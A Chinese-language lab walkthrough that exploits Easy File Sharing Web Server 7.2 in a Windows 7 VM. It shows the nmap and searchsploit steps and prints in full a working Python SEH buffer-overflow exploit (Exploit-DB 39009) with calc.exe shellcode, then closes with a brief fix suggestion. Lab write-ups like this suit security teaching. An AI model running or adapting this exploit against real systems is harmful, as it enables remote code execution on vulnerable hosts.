**Easy File Sharing Web Server 缓冲区溢出漏洞利用**

1.首先我们先打开一台windows7系统的虚拟机，运行efssetup_2018并安装easy file sharing server

![](data:image/png;base64,)

接着我们将easy file sharing web server的端口改为8000，并按下Restart键

![](data:image/png;base64,)

从easy file sharing web
serve的界面我们很容易知道靶机的ip地址为192.168.1.9并且开放了8000端口。下面我们运行kali的nmap命令扫描一下验证一下是否打开，

在kali终端我们输入命令:

    
    
     nmap -sV 192.168.1.9

按下回车

![](data:image/png;base64,)

果然我们的靶机打开了8000端口。接着，我们在Kali中searchsploit中查EasyFileSharing存在哪些漏洞。我们在终端输入命令：

    
    
    searchsploit easy file sharing  

按下回车

![](data:image/png;base64,)

5.左侧为漏洞类型，右侧为对应的测试脚本。我们随便选上图的一个remote溢出漏洞以及对应脚本进行测试

    
    
    Easy File Sharing Web Server 7.2 - HEA | exploits/windows/remote/39009.py

![](data:image/png;base64,)

Kali终端输入：

    
    
    python /usr/share/exploitdb/exploits/windows/remote/39009.py 192.168.1.9 8000

按下回车，得到如下界面：

![](data:image/png;base64,)

我们再回到window7虚拟机界面看看是否发生远程溢出

![](data:image/png;base64,)

发生了远程溢出并且弹出了计算器

2.kali测试39009.py脚本对应的代码如下：

    
    
    # Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow
    
    # Date: 12/2/2015
    
    # Exploit Author: ArminCyber
    
    # Contact: Armin.Exploit@gmail.com
    
    # Version: 7.2
    
    # Tested on: XP SP3 EN
    
    # category: Remote Exploit
    
    # Usage: ./exploit.py ip port
    
    
    
    import socket
    
    import sys
    
    
    
    host = str(sys.argv[1])
    
    port = int(sys.argv[2])
    
    
    
    a = socket.socket()
    
    
    
    print "Connecting to: " + host + ":" + str(port)
    
    a.connect((host,port))
    
    
    
    entire=4500
    
    
    
    # Junk
    
    buff = "A"*4061
    
    
    
    # Next SEH
    
    buff+= "\xeb\x0A\x90\x90"
    
    
    
    # pop pop ret
    
    buff+= "\x98\x97\x01\x10"
    
    
    
    buff+= "\x90"*19
    
    
    
    # calc.exe
    
    # Bad Characters: \x20 \x2f \x5c
    
    shellcode = (
    
    "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
    
    "\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
    
    "\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
    
    "\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
    
    "\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
    
    "\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
    
    "\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
    
    "\x1c\x39\xbd"
    
    )
    
    buff+= shellcode
    
    
    
    buff+= "\x90"*7
    
    
    
    buff+= "A"*(4500-4061-4-4-20-len(shellcode)-20)
    
    
    
    # HEAD
    
    a.send("HEAD " + buff + " HTTP/1.0\r\n\r\n")
    
    
    
    a.close()

3.漏洞修复建议：使用安全的snprintf，或者对字符串长度进行限制
